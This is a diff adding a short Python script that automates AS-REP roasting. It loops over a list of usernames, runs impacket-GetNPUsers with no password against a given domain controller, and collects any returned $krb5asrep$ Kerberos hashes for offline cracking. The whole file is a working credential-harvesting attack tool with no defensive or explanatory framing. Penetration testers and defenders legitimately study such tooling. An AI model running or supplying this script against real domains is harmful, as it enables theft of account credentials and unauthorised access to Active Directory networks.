@@ -1,0 +1,59 @@
+#!/usr/bin/env python3
+
+import argparse
+import subprocess
+import sys
+import os
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='Run impacket-GetNPUsers for each user in a file (AS-REP roasting).'
+    )
+    parser.add_argument('-d', '--domain', required=True, help='Target domain')
+    parser.add_argument('-i', '--ip', required=True, help='Domain controller IP')
+    parser.add_argument('-u', '--userfile', required=True, help='File containing usernames (one per line)')
+    parser.add_argument('--debug', action='store_true', help='Show full command output for each user')
+
+    args = parser.parse_args()
+
+    if not os.path.isfile(args.userfile):
+        print(f"[!] User file '{args.userfile}' not found.")
+        sys.exit(1)
+
+    try:
+        with open(args.userfile, 'r') as f:
+            users = [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(f'[!] Error reading user file: {e}')
+        sys.exit(1)
+
+    roasted_hashes = []
+
+    for user in users:
+        cmd = [
+            'impacket-GetNPUsers',
+            f'{args.domain}/{user}',
+            '-request',
+            '-no-pass',
+            '-dc-ip', args.ip
+        ]
+        print(f'[*] Running: {" ".join(cmd)}')
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+
+        if args.debug:
+            print(result.stdout)
+
+        for line in result.stdout.splitlines():
+            if line.strip().startswith('$krb5asrep$'):
+                roasted_hashes.append(line.strip())
+
+    if roasted_hashes:
+        print(f'\n[+] {len(roasted_hashes)} hash(es) roasted:')
+        for h in roasted_hashes:
+            print(h)
+    else:
+        print('\n[-] No AS-REP roastable users found.')
+
+if __name__ == '__main__':
+    main()
+
